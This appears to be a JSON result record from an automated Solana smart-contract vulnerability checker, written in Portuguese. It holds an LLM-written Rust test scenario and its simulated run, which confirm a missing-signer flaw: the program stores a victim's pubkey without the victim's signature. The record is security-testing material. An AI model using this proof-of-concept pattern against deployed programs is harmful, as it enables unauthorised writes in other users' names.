@@ -1,0 +1,115 @@
+{
+  "category": "SIGNER",
+  "verdict": "confirmed",
+  "exploit_successful": true,
+  "attack_result": "Success",
+  "reason": "ataque aceito e dano verificado: pubkey da vitima gravada no estado sem sua assinatura",
+  "attempts_used": 1,
+  "attempts": [
+    {
+      "attempt": 1,
+      "llm": {
+        "model": "deepseek-flash",
+        "prompt_tokens": 2473,
+        "completion_tokens": 579,
+        "latency_s": 3.37
+      },
+      "raw": "{\n  \"plan\": \"O atacante monta a conta PDA `data_account` derivada de [\\\"data\\\", vitima.key()] e passa a conta da vitima como `user`, sem que ela assine. O baseline usa a mesma instrucao com a vitima assinando, provando que o cenario esta correto. O ataque repete a chamada removendo a assinatura da vitima. O efeito medido e que a pubkey da vitima foi gravada no estado (offset 8..40) e o valor em 40..48, sem a assinatura da autoridade.\",\n  \"scenario\": \"let program_id = env.program_id;\\nlet victim = Pubkey::new_unique();\\nlet attacker = Pubkey::new_unique();\\n\\nlet (data_pda, _bump) = Pubkey::find_program_address(&[b\\\"data\\\", victim.as_ref()], &program_id);\\n\\nlet value: u64 = 424242;\\nlet mut ix_data = vec![1u8];\\nix_data.extend_from_slice(&value.to_le_bytes());\\n\\nlet metas = vec![\\n    AccountMeta::new(data_pda, false),\\n    AccountMeta::new_readonly(victim, true),\\n];\\nlet ix = env.raw_ix(&ix_data, metas);\\n\\nlet data_account = account(&program_id, &[0u8; 49], None);\\nlet victim_account = wallet(1_000_000_000);\\nlet contas = vec![\\n    (data_pda, data_account.clone()),\\n    (victim, victim_account.clone()),\\n];\\n\\nlet base = env.baseline(\\\"set_value legitimo com assinatura da vitima\\\", &ix, &contas);\\n\\nlet metas_attack = vec![\\n    AccountMeta::new(data_pda, false),\\n    AccountMeta::new_readonly(victim, false),\\n];\\nlet ix_attack = env.raw_ix(&ix_data, metas_attack);\\n\\nlet r = env.attack(\\\"set_value sem assinatura da vitima\\\", &ix_attack, &contas);\\nif r.program_result == ProgramResult::Success {\\n    let d = after(&r, &data_pda).data();\\n    env.effect(\\n        \\\"pubkey da vitima gravada no estado sem sua assinatura\\\",\\n        read_pubkey(d, 8) == victim && read_u64(d, 40) == value,\\n    );\\n}\"\n}",
+      "plan": "O atacante monta a conta PDA `data_account` derivada de [\"data\", vitima.key()] e passa a conta da vitima como `user`, sem que ela assine. O baseline usa a mesma instrucao com a vitima assinando, provando que o cenario esta correto. O ataque repete a chamada removendo a assinatura da vitima. O efeito medido e que a pubkey da vitima foi gravada no estado (offset 8..40) e o valor em 40..48, sem a assinatura da autoridade.",
+      "scenario": "let program_id = env.program_id;\nlet victim = Pubkey::new_unique();\nlet attacker = Pubkey::new_unique();\n\nlet (data_pda, _bump) = Pubkey::find_program_address(&[b\"data\", victim.as_ref()], &program_id);\n\nlet value: u64 = 424242;\nlet mut ix_data = vec![1u8];\nix_data.extend_from_slice(&value.to_le_bytes());\n\nlet metas = vec![\n    AccountMeta::new(data_pda, false),\n    AccountMeta::new_readonly(victim, true),\n];\nlet ix = env.raw_ix(&ix_data, metas);\n\nlet data_account = account(&program_id, &[0u8; 49], None);\nlet victim_account = wallet(1_000_000_000);\nlet contas = vec![\n    (data_pda, data_account.clone()),\n    (victim, victim_account.clone()),\n];\n\nlet base = env.baseline(\"set_value legitimo com assinatura da vitima\", &ix, &contas);\n\nlet metas_attack = vec![\n    AccountMeta::new(data_pda, false),\n    AccountMeta::new_readonly(victim, false),\n];\nlet ix_attack = env.raw_ix(&ix_data, metas_attack);\n\nlet r = env.attack(\"set_value sem assinatura da vitima\", &ix_attack, &contas);\nif r.program_result == ProgramResult::Success {\n    let d = after(&r, &data_pda).data();\n    env.effect(\n        \"pubkey da vitima gravada no estado sem sua assinatura\",\n        read_pubkey(d, 8) == victim && read_u64(d, 40) == value,\n    );\n}",
+      "run": {
+        "kind": "ran",
+        "events": [
+          {
+            "step": "setup",
+            "attacker_program": "1111111QLbz7JHiBTspS962RLKV8GndWFwiEaqKM"
+          },
+          {
+            "step": "baseline",
+            "note": "set_value legitimo com assinatura da vitima",
+            "result": "Success",
+            "compute_units": 1808,
+            "account_flags": "-w,sr",
+            "ix_head": "0132790600000000",
+            "accounts": [
+              {
+                "key": "G8xjDo9cSQYsEbjjcdBf6JJt2HXggQwQcwULCUa6NZKW",
+                "signer": false,
+                "writable": true,
+                "owner": "Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS",
+                "data_len": 49,
+                "head": "0000000000000000",
+                "digest": "78877fa898f0b4c4",
+                "post": "000000000000000000000000000000020000000000000000000000000000000000000000000000003279060000000000ff"
+              },
+              {
+                "key": "1111111ogCyDbaRMvkdsHB3qfdyFYaG1WtRUAfdh",
+                "signer": true,
+                "writable": false,
+                "owner": "11111111111111111111111111111111",
+                "data_len": 0,
+                "head": "",
+                "digest": "e3b0c44298fc1c14",
+                "post": ""
+              }
+            ]
+          },
+          {
+            "step": "attack",
+            "note": "set_value sem assinatura da vitima",
+            "result": "Success",
+            "compute_units": 1808,
+            "account_flags": "-w,-r",
+            "ix_head": "0132790600000000",
+            "accounts": [
+              {
+                "key": "G8xjDo9cSQYsEbjjcdBf6JJt2HXggQwQcwULCUa6NZKW",
+                "signer": false,
+                "writable": true,
+                "owner": "Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS",
+                "data_len": 49,
+                "head": "0000000000000000",
+                "digest": "78877fa898f0b4c4",
+                "post": "000000000000000000000000000000020000000000000000000000000000000000000000000000003279060000000000ff"
+              },
+              {
+                "key": "1111111ogCyDbaRMvkdsHB3qfdyFYaG1WtRUAfdh",
+                "signer": false,
+                "writable": false,
+                "owner": "11111111111111111111111111111111",
+                "data_len": 0,
+                "head": "",
+                "digest": "e3b0c44298fc1c14",
+                "post": ""
+              }
+            ]
+          },
+          {
+            "step": "effect",
+            "note": "pubkey da vitima gravada no estado sem sua assinatura",
+            "holds": true
+          }
+        ],
+        "runtime_trace": [
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS invoke [1]",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS consumed 1808 of 1400000 compute units",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS success",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS invoke [1]",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS consumed 1808 of 1400000 compute units",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS success"
+        ],
+        "elapsed_s": 1.7
+      },
+      "verdict": "confirmed",
+      "reason": "ataque aceito e dano verificado: pubkey da vitima gravada no estado sem sua assinatura"
+    }
+  ],
+  "case_id": "SSP-05-P-S",
+  "static_finding": {
+    "category": "SIGNER",
+    "confidence": "high",
+    "evidence": "let user = &accounts[1]; ... data[8..40].copy_from_slice(user.key().as_ref());",
+    "explanation": "A conta `user` e usada como autoridade (sua chave e gravada no estado da conta de dados), mas nao ha nenhuma verificacao de que ela assinou a transacao. Nao ha `is_signer` nem tipo `Signer`. Qualquer atacante pode passar a pubkey de outra pessoa como `user` e gravar dados em nome dela.",
+    "attack_hypothesis": "O atacante fornece a conta `data_account` (PDA valido derivado de `[\"data\", user.key()]`) e uma conta `user` cuja chave publica ele conhece mas nao controla, sem assinar a transacao. O programa grava a pubkey da vitima e o valor no estado, permitindo escrita nao autorizada em nome de outro usuario."
+  }
+}
